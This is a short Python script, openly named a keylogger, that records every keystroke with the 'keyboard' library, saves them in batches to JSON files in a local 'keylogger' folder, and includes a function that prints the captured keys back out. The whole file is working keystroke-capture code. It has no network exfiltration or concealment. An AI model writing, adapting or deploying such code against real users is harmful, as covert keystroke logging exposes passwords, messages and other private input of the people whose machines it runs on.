import keyboard,json,pathlib,datetime
from pprint import pprint

def key_log(list_key=[],list_json=[],dir_name="keylogger",file_name="key_log_",point=0):
    pathlib.Path(dir_name).mkdir(exist_ok=True)
    try:
        while True:
            date_time = datetime.datetime.now()
            list_key.append(keyboard.read_key())
            if len(list_key) == 10:
                with open(f"{dir_name}/{file_name}{date_time.month}-{date_time.minute}.json","w+",encoding="utf-8")as file_key:
                    json_date = {
                            "json_key":list_key
                            }
                    list_json.append(json_date)
                    file_key.write(json.dumps(list_json))

            elif len(list_key) > 10:
                list_key = []
    except KeyboardInterrupt:
        pass

def key_read(dir_name="keylogger"):

    #for path in json.loads(open(f"{dir_name}/{file_name}","r",encoding="utf-8").read()):
        #pprint(",".join(path["json_key"]))
    for path in pathlib.Path(dir_name).glob("*"):
        for json_data in json.loads(open(path,"r",encoding="utf-8").read()):
            print(",".join(json_data["json_key"]))

def main():
    #key_log()
    key_read()

if __name__ == "__main__":
    main()
